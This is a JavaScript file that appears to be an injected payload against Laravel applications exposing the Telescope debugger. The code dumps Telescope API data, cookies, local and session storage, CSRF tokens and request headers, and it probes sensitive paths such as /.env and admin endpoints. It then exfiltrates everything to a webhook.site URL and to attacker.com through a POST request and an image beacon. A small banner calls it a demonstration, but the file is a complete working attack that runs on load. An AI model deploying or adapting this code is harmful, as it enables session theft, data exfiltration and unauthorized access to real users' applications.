// telescope-exploit.js
(function() {
  console.log('ðŸ” Telescope Exploitation Started...');
  
  const ATTACKER_SERVER = 'https://webhook.site/701e5e4d-dc48-4c08-936a-46abb07b1b77';
  const collectedData = {
    url: window.location.href,
    domain: document.domain,
    timestamp: new Date().toISOString(),
    telescope: {},
    requests: [],
    sessions: [],
    internalEndpoints: [],
    userData: {}
  };
  
  // 1. Check if Telescope is accessible
  async function checkTelescope() {
    try {
      const response = await fetch('/telescope', {
        credentials: 'include'
      });
      
      if (response.ok) {
        collectedData.telescope.status = 'ACCESSIBLE';
        collectedData.telescope.url = '/telescope';
        console.log('âœ… Telescope is accessible!');
        return true;
      }
    } catch(e) {
      collectedData.telescope.status = 'NOT_ACCESSIBLE';
      console.log('âŒ Telescope not accessible');
    }
    return false;
  }
  
  // 2. Dump Telescope API data
  async function dumpTelescopeData() {
    const endpoints = [
      '/telescope/api/requests',
      '/telescope/api/exceptions',
      '/telescope/api/logs',
      '/telescope/api/queries',
      '/telescope/api/mail',
      '/telescope/api/notifications',
      '/telescope/api/jobs',
      '/telescope/api/commands',
      '/telescope/api/schedule',
      '/telescope/api/models',
      '/telescope/api/cache',
      '/telescope/api/dumps',
      '/telescope/api/redis',
      '/telescope/api/gateways',
      '/telescope/api/events'
    ];
    
    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint, {
          credentials: 'include',
          headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          collectedData.telescope[endpoint] = data;
          console.log(`âœ… Dumped: ${endpoint}`);
          
          // Extract sensitive data
          if (data.entries) {
            data.entries.forEach(entry => {
              // Look for session data
              if (entry.content && entry.content.session) {
                collectedData.sessions.push(entry.content.session);
              }
              
              // Look for internal endpoints
              if (entry.content && entry.content.uri) {
                if (entry.content.uri.includes('/api/') || 
                    entry.content.uri.includes('/admin/') ||
                    entry.content.uri.includes('/internal/')) {
                  collectedData.internalEndpoints.push({
                    endpoint: entry.content.uri,
                    method: entry.content.method,
                    timestamp: entry.created_at
                  });
                }
              }
              
              // Look for request headers
              if (entry.content && entry.content.headers) {
                collectedData.requests.push({
                  headers: entry.content.headers,
                  timestamp: entry.created_at
                });
              }
            });
          }
        }
      } catch(e) {
        // Silent fail
      }
    }
  }
  
  // 3. Extract current session data
  async function extractSessionData() {
    // Try to get current session via cookies
    collectedData.userData.cookies = document.cookie;
    
    // Try to access Laravel session
    try {
      const response = await fetch('/session', {
        credentials: 'include'
      });
      if (response.ok) {
        const data = await response.json();
        collectedData.userData.session = data;
      }
    } catch(e) {}
    
    // Check localStorage/sessionStorage
    collectedData.userData.localStorage = {};
    collectedData.userData.sessionStorage = {};
    
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        collectedData.userData.localStorage[key] = localStorage.getItem(key);
      }
    } catch(e) {}
    
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        collectedData.userData.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch(e) {}
    
    // Extract CSRF token
    const csrfToken = document.querySelector('input[name="_token"]')?.value;
    if (csrfToken) {
      collectedData.userData.csrf = csrfToken;
    }
    
    // Extract user info from page
    const userElements = document.querySelectorAll('[class*="user"], [id*="user"], [data-user]');
    userElements.forEach(el => {
      if (el.textContent && el.textContent.trim()) {
        collectedData.userData.pageElements = collectedData.userData.pageElements || [];
        collectedData.userData.pageElements.push({
          selector: el.tagName + (el.id ? '#' + el.id : '') + (el.className ? '.' + el.className.split(' ')[0] : ''),
          text: el.textContent.trim().substring(0, 100)
        });
      }
    });
  }
  
  // 4. Discover internal endpoints
  async function discoverEndpoints() {
    // Check common Laravel endpoints
    const commonEndpoints = [
      '/api',
      '/api/v1',
      '/api/v2',
      '/admin',
      '/dashboard',
      '/manager',
      '/control',
      '/backend',
      '/system',
      '/internal',
      '/secret',
      '/private',
      '/config',
      '/env',
      '/.env',
      '/storage',
      '/vendor',
      '/composer.json',
      '/artisan',
      '/horizon',
      '/nova',
      '/vapor',
      '/queue',
      '/broadcasting',
      '/sanctum',
      '/oauth',
      '/passport'
    ];
    
    for (const endpoint of commonEndpoints) {
      try {
        const response = await fetch(endpoint, {
          credentials: 'include'
        });
        
        if (response.status !== 404) {
          collectedData.internalEndpoints.push({
            endpoint: endpoint,
            status: response.status,
            accessible: response.ok
          });
        }
      } catch(e) {}
    }
  }
  
  // 5. Attempt privilege escalation
  async function attemptEscalation() {
    console.log('ðŸ”¼ Attempting privilege escalation...');
    
    // If we have session data, try to modify it
    if (collectedData.userData.session) {
      // Try to add admin role
      const modifiedSession = {
        ...collectedData.userData.session,
        is_admin: true,
        role: 'administrator',
        permissions: ['*']
      };
      
      console.log('Modified session payload:', modifiedSession);
    }
    
    // Try to access admin endpoints with current session
    const adminEndpoints = [
      '/admin/dashboard',
      '/admin/users',
      '/admin/settings',
      '/api/admin/users'
    ];
    
    for (const endpoint of adminEndpoints) {
      try {
        const response = await fetch(endpoint, {
          credentials: 'include'
        });
        
        if (response.ok) {
          console.log(`âœ… Admin endpoint accessible: ${endpoint}`);
          collectedData.escalation = collectedData.escalation || {};
          collectedData.escalation[endpoint] = 'ACCESSIBLE';
        }
      } catch(e) {}
    }
  }
  
  // 6. Exfiltrate data
  async function exfiltrateData() {
    console.log('ðŸ“¤ Exfiltrating collected data...');
    
    // Method 1: Send to attacker server
    try {
      await fetch(ATTACKER_SERVER, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(collectedData)
      });
    } catch(e) {}
    
    // Method 2: Image beacon (works with img-src *)
    const img = new Image();
    const compressedData = btoa(JSON.stringify(collectedData));
    img.src = `https://attacker.com/collect?data=${compressedData}`;
    
    // Method 3: Create visible proof
    createProofOfCompromise();
  }
  
  // 7. Create visible proof
  function createProofOfCompromise() {
    const proof = document.createElement('div');
    proof.innerHTML = `
      <div style="
        position: fixed;
        top: 20px;
        right: 20px;
        width: 350px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        z-index: 999999;
        font-family: Arial, sans-serif;
        border: 2px solid #ff6b6b;
      ">
        <div style="display: flex; align-items: center; margin-bottom: 15px;">
          <div style="font-size: 24px; margin-right: 10px;">ðŸ”“</div>
          <div>
            <h3 style="margin: 0; font-size: 16px;">Security Exploitation Demo</h3>
            <div style="font-size: 12px; opacity: 0.8;">CSP Bypass â†’ Telescope Dump</div>
          </div>
        </div>
        
        <div style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px; margin-bottom: 10px;">
          <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span>Telescope:</span>
            <span style="color: #4cd964;">${collectedData.telescope.status || 'Checking...'}</span>
          </div>
          <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span>Requests Captured:</span>
            <span>${collectedData.requests.length}</span>
          </div>
          <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
            <span>Endpoints Found:</span>
            <span>${collectedData.internalEndpoints.length}</span>
          </div>
          <div style="display: flex; justify-content: space-between;">
            <span>Sessions:</span>
            <span>${collectedData.sessions.length}</span>
          </div>
        </div>
        
        <div style="font-size: 12px; opacity: 0.7; text-align: center;">
          This is a security demonstration
        </div>
      </div>
    `;
    
    document.body.appendChild(proof);
    
    // Auto-remove after 10 seconds
    setTimeout(() => proof.remove(), 10000);
  }
  
  // 8. Main execution
  async function executeAttack() {
    console.log('ðŸš€ Starting attack chain: CSP â†’ Telescope â†’ Data Exfiltration');
    
    // Step 1: Check Telescope access
    const telescopeAccessible = await checkTelescope();
    
    if (telescopeAccessible) {
      // Step 2: Dump Telescope data
      await dumpTelescopeData();
      
      // Step 3: Extract current session
      await extractSessionData();
      
      // Step 4: Discover endpoints
      await discoverEndpoints();
      
      // Step 5: Attempt escalation
      await attemptEscalation();
    } else {
      // Fallback: Just extract session data
      await extractSessionData();
      await discoverEndpoints();
    }
    
    // Step 6: Exfiltrate
    await exfiltrateData();
    
    console.log('ðŸŽ¯ Attack completed!', collectedData);
    
    // Show summary in console
    console.group('ðŸ“Š ATTACK SUMMARY');
    console.log('Telescope:', collectedData.telescope.status);
    console.log('Requests captured:', collectedData.requests.length);
    console.log('Sessions found:', collectedData.sessions.length);
    console.log('Internal endpoints:', collectedData.internalEndpoints.length);
    console.log('User data extracted:', Object.keys(collectedData.userData).length > 0);
    console.groupEnd();
  }
  
  // Start the attack
  executeAttack();
  

})();
